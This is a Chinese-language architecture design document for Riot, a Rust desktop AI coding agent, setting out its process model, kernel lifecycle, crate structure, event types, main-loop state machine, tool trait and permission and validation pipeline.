# Riot 架构设计

> 一个 Rust 实现的 AI coding agent 桌面端。设计基线是对 Claude Code 与 OpenAI Codex 桌面端的架构分析。
>
> 本文档面向的读者是**实现者(主要是 AI)**。凡是标注 `[约束]` 的段落是硬性要求,不得因为"这样写更简洁"而偏离;凡是标注 `[取舍]` 的段落说明了为什么不选另一条路,改动前请先理解原因。

---

## 目录

1. [设计约束与非目标](#1-设计约束与非目标)
2. [进程架构](#2-进程架构)
3. [Crate 划分](#3-crate-划分)
4. [核心类型:事件与消息](#4-核心类型事件与消息)
5. [主循环:Stream 状态机](#5-主循环stream-状态机)
6. [工具系统:trait 即契约](#6-工具系统trait-即契约)
7. [工具调度与并发](#7-工具调度与并发)
8. [取消与中断](#8-取消与中断)
9. [权限系统](#9-权限系统)
10. [上下文管理](#10-上下文管理)
11. [Provider 层](#11-provider-层)
12. [内核 RPC 协议](#12-内核-rpc-协议)
13. [前端架构](#13-前端架构)
14. [TS→Rust 翻译对照](#14-tsrust-翻译对照)
15. [可下载能力包](#15-可下载能力包)

---

## 1. 设计约束与非目标

### 1.1 五条设计哲学

这五条继承自 Claude Code,是所有子系统的共同前提:

1. **事件即数据流**。助手回复、工具结果、进度、系统提示、错误——全部是带类型的事件,通过一个 `Stream` 流动。UI、持久化、SDK 只是不同的消费者。
2. **Fail-closed**。工具默认不可并发、默认会写、默认需要权限;shell 命令解析不了就问人。**在 Rust 里这条由 trait 默认方法强制,而不是靠工厂函数补默认值。**
3. **错误是对话内容,不是异常**。工具失败、参数校验失败一律转成 `tool_result(is_error)` 喂回模型自我纠正。**主循环的签名里不允许出现 `Result`**,详见 §5.3。
4. **上下文是稀缺资源**。压缩分层递进(落盘 → 清理 → 总结),prompt cache 前缀稳定性是硬约束。
5. **扩展点共享同一套发现 → 注册 → 执行管道**。工具、命令、skill、hook、agent 定义不各搞一套。

### 1.2 非目标(明确不做)

- **不做 CLI 产品**。内核是独立进程,但它的对外接口是 JSON-RPC,不是给人用的命令行。保留一个 `--stdio` 调试入口即可。
- **第一阶段不做 Team / Coordinator**。多 agent 只做 Explore 这类只读搜索子 agent。
- **不做云端执行**。所有 agent 跑在本地。
- **不追求 Linux 首发**。macOS 优先,Windows 次之,Linux 看 WebView 情况再说。

### 1.3 这份设计对实现者的核心要求

Agent 的正确性大部分体现在**编译器检查不到的地方**:中断后有没有补齐 tool_result 配对、错误有没有被 `?` 抛穿主循环、并发批次里有没有混进写操作。因此:

`[约束]` 所有在 `docs/VERIFICATION.md` 中定义的不变量断言必须实现,并在 debug build 中默认开启。任何 PR 不得关闭或弱化这些断言。

---

## 2. 进程架构

```
┌──────────────────────────────────────────────────────────────┐
│  Renderer (WebView)                                          │
│  React + TypeScript + Vite                                   │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ bridge/  —— 唯一允许调用宿主的地方                       │  │
│  └────────────────────────────────────────────────────────┘  │
└───────────────────────────┬──────────────────────────────────┘
                            │  Tauri command / Channel
┌───────────────────────────┴──────────────────────────────────┐
│  Host (Tauri, Rust)                                          │
│  · 窗口、菜单、托盘、全局快捷键                                │
│  · 内核进程生命周期管理(spawn / 健康检查 / 优雅关闭)          │
│  · RPC 路由:renderer ←→ kernel                              │
│  · OS 能力:keychain、文件对话框、通知、PTY、编辑器唤起        │
│  · UI 状态持久化(SQLite:窗口布局、会话列表、自动化调度)      │
└───────────────────────────┬──────────────────────────────────┘
                            │  JSON-RPC over stdio (newline-delimited)
┌───────────────────────────┴──────────────────────────────────┐
│  Kernel (独立 Rust 进程,一个会话一个或多会话共享一个)         │
│  · 主循环 · 工具执行 · 权限决策 · 上下文管理 · Provider 调用   │
│  · 会话数据持久化(SQLite:消息、工具结果、token 账本)          │
└──────────────────────────────────────────────────────────────┘
```

### 2.1 为什么内核要独立进程

`[取舍]` 把内核直接写进 Tauri 宿主会简单不少,但有三个理由不这么做:

1. **崩溃隔离**。Agent 会 spawn 大量子进程、读几十 MB 文件、跑全仓库正则。内核 panic 或 OOM 时,UI 应该还活着,能显示"会话崩溃,是否重启"。
2. **阻塞隔离**。Tauri 宿主要保持对窗口事件的响应,不能被内核的重活拖住。
3. **可测试性**。内核脱离 GUI 就能跑,集成测试不需要起窗口。这一条在开发期省的时间最多。

### 2.2 分阶段落地

`[约束]` **不要一上来就拆进程。**

- **阶段 A**:内核以 library crate 形式被宿主直接调用,但**所有调用必须穿过 `riot-protocol` 定义的接口**,不允许宿主直接 `use riot_core::internals::*`。
- **阶段 B**:内核编译成独立二进制,宿主改用 stdio transport。此时 `KernelClient` 换一个实现,宿主与 UI 的其余代码一行不动。

判断何时进入阶段 B:当内核的单次操作开始出现 >200ms 的阻塞,或者第一次遇到 panic 拖垮窗口。

**当前状态:阶段 B 已落地。**会话装配在 `crates/riot-kernel`(`SessionManager`),宿主 `AppState` 是 RPC 客户端(`kernel/client.rs`),职责划分:宿主是会话注册表与设置的权威(id/标题/mode 等,纯本地),内核会话是按需水合的运行时投影(`session.resume` 幂等),每轮配置随 `TurnConfig` 传输。终端/浏览器走反向 RPC(`protocol::hostcall`,内核经同一条 stdio 管道调宿主)。内核崩溃后合成 Done、按退避自动重启;打包经 externalBin(`scripts/stage-kernel.mjs` 按 target triple 命名放进 `src-tauri/binaries/`)。宿主↔真内核的端到端链路由 `src-tauri/tests/kernel_e2e.rs` 盯着。

### 2.3 内核进程的 spawn 与关闭 ⭐

`[约束]` **不要用 `tauri-plugin-shell` 的 `sidecar().spawn()` 来启动内核。**用 `externalBin` 只做打包分发,实际进程用 `tokio::process::Command` + `process-wrap` 自己管。

三条理由,每一条单独都足以否决官方 sidecar:

1. **`CommandChild` 没有关闭 stdin 的能力。**它只有 `kill()`、`pid()`、`write()` 三个方法。而 `drop(stdin)` 制造 EOF 正是 stdio JSON-RPC 服务的标准退出握手——`codex app-server` 就是这么退的。用官方 API 你只能 `kill()`,内核没有机会 flush 会话状态。
2. **不做进程树清理,且这是长期未修的已知问题。**`tauri::process` 模块到 2.11.5 为止只有 `current_binary` 和 `restart`,`kill_process_tree` 的 PR 未合入。
3. **有两条重要路径根本不会执行清理钩子。**`tauri dev` 停止时对 cargo 发 SIGKILL,NSIS 安装器升级时用 `TerminateProcess`。所以"靠 `RunEvent::Exit` 做清理"这个方案在开发期和升级期都失效。

正确做法是让**操作系统**保证"父进程无论怎么死,子树跟着死"——Windows 用 Job Object 的 `KILL_ON_JOB_CLOSE`,Unix 用进程组。`process-wrap` crate 把两者统一抽象了,Chromium 和 VS Code 都是这个路子。

关闭序列:

```
1. 发 JSON-RPC shutdown 请求      内核有机会 flush 会话、杀子进程
2. drop(stdin) → 内核收到 EOF     标准退出信号
3. 等内核自己退出,超时 5s
4. 无条件 killpg / Job Object     清理内核留下的后代
5. reap                           避免僵尸
```

`[约束]` **第 4 步不能写成「只在超时时才杀」。**这是一个实测踩到的坑:内核优雅退出**不等于**它 spawn 的后台子进程也退出了,那些会被 init 收养成孤儿,一直活到关机。

这类泄漏比"内核卡死"隐蔽得多——功能全对,测试全绿,只是机器越跑越慢。我们的进程生命周期测试第一次跑就抓到了它:走强杀路径的用例全过,走优雅关闭路径的全泄漏。

`[约束]` **第 3 步要等的是内核进程本身,不是整个进程组。**`process-wrap` 的 `ChildWrapper::wait()` 等的是全组退出,而组里可能有内核故意留下的长命进程(比如一个后台索引器),那会一直等到超时。用 `inner_mut().wait()` 只等内核自己。

`[约束]` **第一个要写的测试是进程生命周期测试。**反复 spawn / kill / 重启,断言没有孤儿残留,优雅关闭和强杀两条路径都要覆盖。这是整个宿主层唯一没有官方方案、且做错了会持续咬人的部分,值得优先于任何 UI 工作。见 `src-tauri/tests/process_lifecycle.rs`。

### 2.4 进程模型:一个会话一个内核,还是共享

`[取舍]` 采用**多会话共享一个内核进程**,理由:

- 会话之间要共享 MCP server 连接、模型 client 连接池、文件监听器。每会话一进程会把这些资源乘上会话数。
- Rust 的 tokio 运行时本来就适合在一个进程里跑大量并发任务,不需要靠进程做并发。

代价是单个会话的崩溃会影响全部会话。缓解手段:每个会话的工具执行包在 `tokio::task` 里并捕获 panic(`JoinHandle` 的 `Err(JoinError::Panic)`),把 panic 转成该会话的错误事件,不让它逃逸到进程级。

`[约束]` 内核进程的顶层必须安装 panic hook,把 panic 信息写入日志并通过 RPC 通知宿主,不允许静默死亡。

---

## 3. Crate 划分

```
Riot/
├── Cargo.toml                    # workspace
├── crates/
│   ├── riot-protocol/         # RPC 协议 + 共享类型 + TS 绑定生成
│   ├── riot-core/             # 主循环、状态机、上下文管理
│   ├── riot-tools/            # 工具实现
│   ├── riot-providers/        # 模型适配层
│   ├── riot-permissions/      # 权限决策 + Bash AST 分析
│   ├── riot-store/            # JSONL transcript 持久化
│   ├── riot-mcp/              # MCP 客户端
│   ├── riot-runtime/          # 文件系统 / 进程 / 网络的真实实现
│   ├── riot-kernel/           # 内核二进制入口(阶段 B 启用)
│   └── riot-browser/          # CEF 离屏浏览器（独立 workspace）
├── src-tauri/                    # Tauri 宿主
├── src/                          # React UI
├── docs/
│   ├── ARCHITECTURE.md
│   └── VERIFICATION.md
└── crates/riot-core/tests/golden/  # 黄金回放用例
```

### 3.1 依赖方向

```
protocol  ←  core  ←  kernel
    ↑         ↑
    │         ├── tools ── permissions
    │         ├── providers
    │         ├── store
    │         └── mcp
    │
  src-tauri ── runtime
```

`[约束]` **依赖方向不可逆。**具体禁令:

- `riot-core` 不得依赖 `src-tauri` 或任何 UI 相关 crate;
- `riot-protocol` 不得依赖 workspace 内任何其它 crate(它是叶子,只依赖 serde / schemars);
- `riot-tools` 不得直接依赖 `riot-core`,工具通过 `protocol` 里定义的 trait 和类型与内核交互(否则会形成循环)。

违反这条的后果不是"不好看",是阶段 B 拆进程时会发现拆不开。

### 3.2 拆成多个小 crate 的理由

`[取舍]` 单 crate 更简单,但 Rust 的增量编译以 crate 为单位。AI 开发时改动频率最高的是 `tools` 和 `core`,把 `providers`、`permissions`、`store` 拆出去,能让大部分改动只重编一个小 crate。**这是为 AI 的迭代速度做的优化,不是洁癖。**

配套的编译加速措施(开工前配好):

```toml
# .cargo/config.toml
[build]
rustc-wrapper = "sccache"

[target.aarch64-apple-darwin]
rustflags = ["-C", "link-arg=-fuse-ld=lld"]
```

```toml
# Cargo.toml
[profile.dev]
debug = 1          # 减少调试信息体积,加快链接
[profile.dev.package."*"]
opt-level = 2      # 依赖用优化编译,自己的代码不优化
```

`[约束]` AI 在迭代时优先跑 `cargo check`,只在需要运行测试时才 `cargo build`。

---

## 4. 核心类型:事件与消息

### 4.1 AgentEvent:内核对外的唯一输出

```rust
// crates/riot-protocol/src/event.rs

/// 内核向外发出的所有事件。这是 UI、持久化、测试的共同输入。
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum AgentEvent {
    /// 一轮 API 请求开始(UI 显示 spinner)
    RequestStart { turn: u32, model: String },

    /// 流式增量。高频,UI 用于打字机效果。
    /// 不进 transcript —— transcript 只记 Message。
    Delta(StreamDelta),

    /// 一条完整消息。可持久化、可回放、可送回模型。
    Message(Message),

    /// 工具执行进度。不进 transcript。
    Progress { tool_use_id: ToolUseId, payload: ProgressPayload },

    /// 权限请求。内核在此暂停,等宿主回 PermissionResponse。
    PermissionRequest { request_id: RequestId, detail: PermissionAsk },

    /// 上下文压缩开始。不进 transcript —— 它是瞬时状态。
    /// 摘要压缩要真调一次模型,这条事件是那几十秒的唯一解释:
    /// 没有它,界面上的等待动画和"模型正在回答"一模一样。
    Compacting,

    /// 上下文压缩发生。UI 可提示用户。
    Compacted { before_tokens: u32, after_tokens: u32, strategy: CompactStrategy },

    /// 本轮那条提问被撤回了:模型一个字都没给出,用户就按了停止。
    /// 消息已从历史和 transcript 移除,界面撤掉气泡、把原文放回输入框。
    /// 排在同一轮的 Done 之前(Done 必须是最后一个)。见 §8.5。
    PromptWithdrawn { message_id: MessageId, session_empty: bool },

    /// 终止。这是流的最后一个事件,之后 Stream 结束。
    Done { reason: TerminalReason },
}

#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(tag = "reason", rename_all = "snake_case")]
pub enum TerminalReason {
    Completed,
    MaxTurns { limit: u32 },
    Aborted { by: AbortSource },
    AbortedTools,
    StopHookPrevented { message: String },
    /// 不可恢复错误。可恢复的错误不会走到这里(见 §5.4)。
    Error { error: AgentError },
}
```

`[约束]` **`Done` 必须是流的最后一个事件,且必须出现。**即使内核 panic 被捕获,也要合成一条 `Done { reason: Error }`。消费者依赖这一点来做资源清理;缺失会导致 UI 永远转圈。

### 4.2 为什么终止原因是事件而不是返回值

`[取舍]` TS 版本用 `AsyncGenerator<Event, Terminal>`,yield 通道传数据、return 通道传终止原因,控制流和数据流分离得很干净。

Rust 做不到这一点:`async_stream::stream!` 宏要求块返回 `()`,`Stream` trait 也没有返回值的概念。有个 `async-gen` crate 支持 yield + return,但单人维护、22 star,不适合当内核依赖。

所以终止原因降级为一个事件变体。**这不只是妥协,也有好处**:终止原因现在可以被序列化、被持久化、被回放测试断言,而 TS 版本的 return 值在跨进程时反而要额外包装。

`[约束]` 实现者不要试图用 `async-gen` 或 nightly 的 `gen` 块"还原"TS 的形态。这条路已经评估过,不走。

### 4.3 Message:进 transcript 的东西

```rust
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(tag = "role", rename_all = "snake_case")]
pub enum Message {
    User { id: MessageId, content: Vec<UserContent>, meta: MessageMeta },
    Assistant { id: MessageId, content: Vec<AssistantContent>, usage: Option<Usage>, meta: MessageMeta },
    /// 系统消息:仅展示给用户,不送回模型
    System { id: MessageId, level: SystemLevel, text: String },
}

#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum AssistantContent {
    Text { text: String },
    Thinking { text: String, signature: Option<String> },
    ToolUse { id: ToolUseId, name: String, input: serde_json::Value },
}

#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum UserContent {
    Text { text: String },
    ToolResult { tool_use_id: ToolUseId, content: ToolResultContent, is_error: bool },
    /// 附件:文件引用、图片、系统提醒。展开时机由上下文管理层决定。
    Attachment(Attachment),
}
```

`[约束]` **控制面消息(System)不进 API 请求。**序列化到 provider 时必须过滤掉。这类消息只是给用户看的。

### 4.4 类型安全的 ID

```rust
macro_rules! typed_id {
    ($name:ident) => {
        #[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize, JsonSchema)]
        pub struct $name(pub String);
        impl $name {
            pub fn new() -> Self { Self(nanoid::nanoid!()) }
        }
    };
}

typed_id!(SessionId);
typed_id!(MessageId);
typed_id!(ToolUseId);
typed_id!(RequestId);
typed_id!(AgentId);
```

`[约束]` 不允许用裸 `String` 传 ID。这是 Rust 相对 TS 的免费收益之一,不要浪费——把 `ToolUseId` 传成 `MessageId` 这类错误在 TS 里要靠测试发现,在这里编译器直接挡掉。

---

## 5. 主循环:Stream 状态机

### 5.1 形态

```rust
// crates/riot-core/src/loop.rs

pub fn run_agent(
    initial: AgentState,
    deps: Arc<AgentDeps>,
    cancel: CancellationToken,
) -> impl Stream<Item = AgentEvent> + Send {
    stream! {
        let mut state = initial;

        loop {
            // ── 1. 中断检查 ────────────────────────────────
            if cancel.is_cancelled() {
                for ev in synthesize_missing_tool_results(&state) { yield ev; }
                yield AgentEvent::Done { reason: TerminalReason::Aborted { by: AbortSource::User } };
                return;
            }

            yield AgentEvent::RequestStart { turn: state.turn, model: state.model.clone() };

            // ── 2. 上下文裁剪(轻 → 重,顺序严格)──────────────
            match prepare_context(&mut state, &deps).await {
                ContextOutcome::Ok => {}
                ContextOutcome::Compacted(info) => yield AgentEvent::Compacted { .. },
                ContextOutcome::Blocked(err) => {
                    yield AgentEvent::Done { reason: TerminalReason::Error { error: err } };
                    return;
                }
            }

            // ── 3. 流式消费模型输出 ─────────────────────────
            let mut turn = TurnAccumulator::new();
            let mut model_stream = deps.provider.stream(&state, cancel.child_token());

            while let Some(item) = model_stream.next().await {
                match classify(item) {
                    // 可恢复错误先扣留,不 yield(见 §5.4)
                    Classified::Recoverable(err) => turn.withhold(err),
                    Classified::Delta(d) => yield AgentEvent::Delta(d),
                    Classified::Message(m) => { turn.push(&m); yield AgentEvent::Message(m); }
                }
            }

            // ── 4. 恢复路径 ────────────────────────────────
            if let Some(err) = turn.withheld() {
                match attempt_recovery(&mut state, err, &deps).await {
                    Recovery::Retry(transition) => { state.transition = Some(transition); continue; }
                    Recovery::Surface(msg) => {
                        yield AgentEvent::Message(msg);
                        yield AgentEvent::Done { reason: TerminalReason::Error { .. } };
                        return;
                    }
                }
            }

            // ── 5. 退出判据:只看有没有 tool_use 块 ───────────
            if !turn.has_tool_use() {
                match run_turn_end_hooks(&mut state, &deps).await {
                    TurnEnd::Continue(transition) => { state.transition = Some(transition); continue; }
                    TurnEnd::Stop(reason) => { yield AgentEvent::Done { reason }; return; }
                }
            }

            // ── 6. 工具执行 ────────────────────────────────
            let mut tool_stream = execute_tools(turn.tool_uses(), &state, &deps, cancel.child_token());
            while let Some(ev) = tool_stream.next().await { yield ev; }

            // ── 7. 收尾 ────────────────────────────────────
            state.advance(turn, drain_queued_messages(&state.session_id));

            if state.turn >= state.max_turns {
                yield AgentEvent::Done { reason: TerminalReason::MaxTurns { limit: state.max_turns } };
                return;
            }
        }
    }
}
```

### 5.2 退出判据

`[约束]` **循环是否继续,只看本轮流式结束后有没有收到 `tool_use` 块。**

不要用 `stop_reason == "tool_use"` 判断。Claude Code 的源码注释明确指出这个字段不可靠,实测会导致循环提前退出或死循环。Provider 层可以记录 `stop_reason` 用于遥测,但不得参与循环控制。

唯一的例外:`stop_reason == "max_tokens"` 时 provider 在消息后补报 `OutputLimit` 可恢复错误(与 OpenAI 侧 `finish_reason == "length"` 对齐)。它不决定循环走向,只把"输出被截断"从静默变成可恢复——静默接受截断的下场是回答缺一截没人知道,压缩场景下缺的恰是总结的最后几节;字段缺失时漏报,退回旧行为,不会误伤。

### 5.3 主循环签名里没有 Result

`[约束]` `run_agent` 返回 `impl Stream<Item = AgentEvent>`,**不是** `impl Stream<Item = Result<AgentEvent, E>>`。

这不是风格问题,是用类型系统强制哲学 #3。因为返回类型里没有错误通道,`stream!` 块内部就**不能用 `?` 往外抛**——编译器会拒绝。实现者被迫在每个可能失败的地方显式决定:这个错误是转成消息给模型看,还是转成 `Done { Error }` 终止。

对照:TS 版本靠"约定"保证错误不抛穿主循环,实际上要靠 code review 和运行时兜底。这里靠编译器。

内部函数当然可以返回 `Result`,但在进入 `stream!` 块的边界必须被消化掉:

```rust
// 正确
match do_something().await {
    Ok(v) => yield AgentEvent::Message(v.into()),
    Err(e) => yield AgentEvent::Message(error_message_for_model(e)),
}

// 编译不过(也不应该想这么写)
let v = do_something().await?;
```

### 5.4 扣留机制

可恢复错误(上下文溢出、输出 token 耗尽、媒体过大)在流式循环中**先不 yield**,但记进 `TurnAccumulator`:

```
流中发现上下文溢出 → withhold(UI 看不到)
  → 尝试细粒度归档(便宜)→ 成功则 continue 重试
  → 尝试全量 LLM 总结(贵)→ 成功则 continue 重试
  → 都失败 → 这时才 yield 错误 → Done
```

理由:UI 一旦看到错误事件就会结束会话渲染,而此时恢复循环还在跑,没人听结果。**先吞后吐**避免消费者过早 teardown。

`[约束]` 防死循环护栏,三条都要实现:

1. `hasAttemptedReactiveCompact` 这类恢复标志位,在 stop-hook 重试路径上**不重置**;
2. **API 错误事件上绝不跑 stop hooks**(否则 error → hook 注入更多 token → 重试 → error 的死循环。Claude Code 的注释记录这个 bug 烧掉过几千次 API 调用);
3. 自动压缩连续失败 3 次熔断。

### 5.5 AgentState

```rust
pub struct AgentState {
    pub session_id: SessionId,
    pub messages: Vec<Message>,
    pub model: String,
    pub system: String,
    pub turn: u32,
    pub max_turns: u32,

    // 恢复计数器 —— 这些字段的重置时机是 bug 高发区,改动前读 §5.4
    pub output_limit_recovery_count: u8,
    pub attempted_reactive_compact: bool,
    pub compact_failure_streak: u8,
    pub max_output_tokens_override: Option<u32>,

    /// 上一轮为何继续。仅用于测试与观测,不参与决策。
    pub transition: Option<Transition>,
}
```

`Transition` 定义在 `riot-protocol`(不是 core),并且**进事件流**——它是 `AgentEvent::RequestStart` 的 `after` 字段:

```rust
AgentEvent::RequestStart { turn: u32, model: String, after: Option<Transition> }
```

放进协议有两个理由。一是前端要用:用户需要知道"转了 30 秒是因为在压缩上下文"而不是以为卡住了。二是黄金回放需要它:没有这个字段,"模型正常要求继续"和"因错误在重试"产生的事件序列完全一样,恢复逻辑写错了测试也发现不了。

`[约束]` 每次 `continue` 之前必须设置 `state.transition`,它会在下一个 `RequestStart` 上出现。

#### 恢复计数器的重置时机

这是整个主循环里最容易改错的地方。**两类计数器的重置规则不同**,写在一起会让其中一类失效:

| 计数器 | 防什么 | 何时重置 |
|--------|--------|---------|
| `attempted_reactive_compact` | 单轮内「压缩 → 还是溢出 → 又压缩」死循环 | `advance_turn()`,即正常推进下一轮时 |
| `output_limit_recovery_count` | 单轮内无限对半砍输出上限 | 同上 |
| `compact_failure_streak` | **跨会话**反复压缩失败 | 只在压缩真正成功时清零 |

`[约束]` 重置只能发生在 `AgentState::advance_turn()` 里。恢复重试路径(`continue` 回循环开头)绝不能调它。

一个实际踩到的推论:压缩熔断(`compact_failure_streak >= 3`)的触发路径是"用户发消息 → 溢出 → 压缩失败 → 终止"连续发生三次,**不是**单次 `run_agent` 内部循环三圈。因为单次调用里 `attempted_reactive_compact` 已经把压缩限制成最多一次了。判错这一点会写出一个永远不执行的分支——最初的实现就是这样,而且它编译通过、测试全绿,只是那段代码从来没跑过。

#### 压缩的接缝

`Recovery::Retry(ReactiveCompactRetry)` 只是**决策**,压缩动作在主循环里执行:

```rust
Recovery::Retry(transition) => {
    turn.discard_for_retry();
    if transition == Transition::ReactiveCompactRetry {
        match deps.compactor.compact(state.messages.clone(), budget).await {
            CompactResult::Compacted { messages, .. } => {
                invariants::check_tool_pairing(&messages);  // ← 见下
                state.messages = messages;
                state.compact_failure_streak = 0;
                yield AgentEvent::Compacted { .. };
            }
            CompactResult::Failed { .. } => state.compact_failure_streak += 1,
        }
    }
    state.transition = Some(transition);
    continue;
}
```

决策(`attempt_recovery`)是纯函数,副作用在调用方——这样"什么情况下该重试"能脱离 IO 单测,而那部分的护栏最多也最容易错。

`[约束]` **压缩后必须立刻检查 tool_use/tool_result 配对。**压缩是最容易破坏配对的操作:删掉一条带 `tool_use` 的 assistant 消息,它的 `tool_result` 就成了"无来源"的孤儿,下一次请求 400。正确做法是清空内容而不是删除消息——`tool_result` 换成 `ToolResultContent::Cleared` 占位符。

这条不是推演出来的。混沌测试第一次跑 500 个 seed 就抓到 10 个,全是同一根因:测试用的假压缩器写了"保留首尾,丢掉中间"。测试替身尚且如此,真实现掉进去只是时间问题。

### 5.6 依赖注入

```rust
pub struct AgentDeps {
    pub provider: Arc<dyn Provider>,
    pub tools: Arc<ToolRegistry>,
    pub permissions: Arc<dyn PermissionEngine>,
    pub compactor: Arc<dyn Compactor>,
    pub store: Arc<dyn SessionStore>,
    pub clock: Arc<dyn Clock>,   // 测试要能控制时间
}
```

`[约束]` **不允许在 core 里直接调 `SystemTime::now()` 或 `tokio::time::sleep`**,一律通过 `Clock`。microcompact 的 60 分钟缓存冷热判断依赖时间,黄金回放测试必须能把时间快进。

---

## 6. 工具系统:trait 即契约

### 6.1 Tool trait

```rust
// crates/riot-protocol/src/tool.rs

#[async_trait]
pub trait Tool: Send + Sync + 'static {
    // ── 必须实现(编译器强制)──────────────────────────
    fn name(&self) -> &'static str;
    fn input_schema(&self) -> schemars::Schema;
    /// 进 API tools[].description 的完整使用说明。
    fn prompt(&self, ctx: &PromptContext) -> String;
    async fn call(&self, input: Value, ctx: ToolContext) -> ToolOutcome;

    // ── fail-closed 默认值 ───────────────────────────
    fn is_read_only(&self, _input: &Value) -> bool { false }
    fn is_concurrency_safe(&self, _input: &Value) -> bool { false }
    fn is_destructive(&self, _input: &Value) -> bool { false }
    fn interrupt_behavior(&self) -> InterruptBehavior { InterruptBehavior::Cancel }
    fn max_result_size_chars(&self) -> ResultBudget { ResultBudget::Limit(50_000) }
    fn check_permissions(&self, _input: &Value, _ctx: &PermissionContext) -> PermissionResult {
        PermissionResult::Passthrough
    }
    async fn validate_input(&self, _input: &Value, _ctx: &ToolContext) -> Result<(), ValidationError> {
        Ok(())
    }
    /// 喂给安全分类器的文本。默认空 = 跳过分类器。
    /// 安全敏感工具必须覆盖。
    fn classifier_input(&self, _input: &Value) -> Option<String> { None }

    // ── UI 通道(与模型通道分离,见 §6.3)─────────────
    fn user_facing_name(&self) -> &str { self.name() }
    fn describe(&self, input: &Value) -> String;
    fn render_result(&self, outcome: &ToolOutcome) -> Option<UiPayload>;
}
```

`[取舍]` TS 版本用"数据对象 + `buildTool()` 工厂补默认值"。Rust 用 **trait 默认方法**,效果更好:

- 默认值同样是 fail-closed,漏写不会误并行写;
- 但**没有默认值的方法编译器强制你实现**。TS 的工厂函数做不到这一点——漏写 `prompt()` 要到运行时才发现。

`[约束]` **不允许给 `call`、`prompt`、`input_schema` 加默认实现。**这三个必须由每个工具显式提供。

### 6.2 ToolOutcome:成功和失败都是正常返回

```rust
pub enum ToolOutcome {
    Ok {
        /// 给模型看的结果
        model_content: ToolResultContent,
        /// 给 UI 看的结构化数据。None = UI 不显示(如 TodoWrite)
        ui_payload: Option<UiPayload>,
        /// 旁路注入的消息(图片 metadata 等),不塞进 tool_result
        side_messages: Vec<Message>,
    },
    /// 工具级失败。会转成 tool_result(is_error) 喂回模型。
    /// 注意这是 enum 变体,不是 Err —— 失败是正常的返回值。
    Failed {
        error_for_model: String,
        ui_payload: Option<UiPayload>,
    },
    Cancelled,
}
```

`[约束]` `Tool::call` 的返回类型是 `ToolOutcome`,**不是 `Result<_, _>`**。工具内部可以自由用 `?`,但必须在函数边界把 `Result` 转成 `ToolOutcome::Failed`:

```rust
async fn call(&self, input: Value, ctx: ToolContext) -> ToolOutcome {
    match self.run(input, ctx).await {
        Ok(out) => ToolOutcome::Ok { .. },
        Err(e) => ToolOutcome::Failed { error_for_model: e.to_model_string(), ui_payload: None },
    }
}
```

这样类型系统就保证了"工具错误不会抛穿主循环"。

### 6.3 双通道结果

同一个工具结果走两条完全独立的路径:

| 通道 | 方法 | 例(Read 工具) |
|------|------|---------------|
| 给模型 | `ToolOutcome::Ok.model_content` | 带行号的文件内容 + system-reminder |
| 给 UI | `ToolOutcome::Ok.ui_payload` | `{ kind: "file_read", path, line_count: 42 }` |

`[约束]` **UI payload 是结构化数据,不是渲染好的字符串。**渲染在 React 侧做。

这是相对 TS 版本的一个实质改进:Claude Code 的 `renderToolResultMessage()` 直接返回 Ink 组件,内核和 UI 耦合在一起。桌面端不能这么做——内核要能在没有 UI 的情况下跑(测试、headless)。

```rust
#[derive(Serialize, Deserialize, JsonSchema)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum UiPayload {
    FileRead { path: PathBuf, line_count: usize, truncated: bool },
    FileDiff { path: PathBuf, hunks: Vec<DiffHunk> },
    BashOutput { stdout: String, stderr: String, exit_code: i32 },
    SearchResults { matches: Vec<SearchMatch>, total: usize },
    Todos { items: Vec<TodoItem> },
    Plain { text: String },
}
```

### 6.4 执行管线

```
 1. 工具查找(找不到 → alias 回退 → 仍无则 Failed 结果告知模型)
 2. 取消检查(已取消 → Cancelled)
 3. Schema 校验(serde + jsonschema)
    失败 → 把校验错误转成自然语言纠错指令
 4. validate_input() 语义校验(文件存在?已经 Read 过?)
 5. PreToolUse hooks
 6. 权限决策
    deny/ask 被拒 → Failed 结果
 7. call() 执行,progress 事件实时上抛
 8. 结果体积检查 → 超限落盘 + 预览替换
 9. PostToolUse hooks
10. panic 兜底:JoinError::Panic → Failed 结果
```

`[约束]` 第 10 步必须实现。工具在 `tokio::task` 里执行,panic 要被 `JoinHandle` 捕获转成 `Failed`,不允许 panic 逃逸到会话之外。

### 6.5 校验错误的措辞

错误文本是**给模型的纠错指令**,不是给人看的堆栈:

```xml
<tool_use_error>InputValidationError: Bash failed due to the following issue:
The required parameter `command` is missing</tool_use_error>
```

`[约束]` 不要把 serde 的原始错误(`missing field \`command\` at line 1 column 42`)直接喂给模型。要转成祈使句。Claude Code 源码里的原话:*"surprisingly, the model is not great at generating valid input"*——这一层翻译的投入回报很高。

### 6.6 先读后写协议

```rust
pub struct FileState {
    pub content: String,
    pub mtime: SystemTime,
    pub view: FileView,   // Full | Partial { offset, limit }
}
```

Edit 工具的 `validate_input` 检查链:

1. 自己从磁盘载入全文（缓存没有、只看过一段、或磁盘更新了都重新读）。不把"请先完整 Read"踢回给模型 —— Read 单次最多 2000 行，超长文件永远 Partial，那是死锁;
2. 按**磁盘全文**做 `old_string` 唯一性检查;
3. `call()` 内再做一次原子区段比对(防 TOCTOU);
4. 写入成功后回写缓存。

Write 仍要求先 Read：全量覆盖会盖掉没看到的内容。`Partial` 视图不拒绝 Write。磁盘 mtime 变了则拒绝，要求重新 Read。

`[约束]` 第 3 步不能省。第 2 步的检查和实际写入之间有时间窗口,外部编辑器可能正好在这个窗口里保存。

`[约束]` 第 3 步的比对必须比对**内容**,不能只重查 mtime。HFS+ 和部分 NFS 上 mtime 精度只有 1 秒,用户在同一秒内保存的话 mtime 完全可能不变。只查 mtime 等于没查,而失败模式是静默覆盖用户的改动。

